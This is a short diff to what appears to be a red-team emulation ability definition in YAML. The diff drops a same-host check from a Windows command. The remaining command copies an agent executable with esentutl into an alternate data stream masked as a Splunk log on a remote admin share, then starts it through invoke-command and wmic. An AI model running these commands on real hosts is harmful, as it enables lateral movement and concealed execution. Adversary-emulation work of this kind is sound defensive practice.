@@ -8,11 +8,10 @@
     additional_info: {}
     variations: []
     platform: windows
-    command: 'if("#{remote.host.fqdn}" -eq "#{local.host.fqdn}") { echo "fqdn matches
-      host, skipping to avoid repeat agents"} else { esentutl.exe /y #{location} /d
+    command: 'esentutl.exe /y #{location} /d
       \\#{remote.host.fqdn}\c$\users\public\splunk.log:#{exe_name}; invoke-command
       #{remote.host.fqdn} -scriptblock { wmic process call create "C:\users\public\splunk.log:#{exe_name}
-      -server #{server} -group red" } }'
+      -server #{server} -group red" }'
     code: null
     language: null
     payloads: []
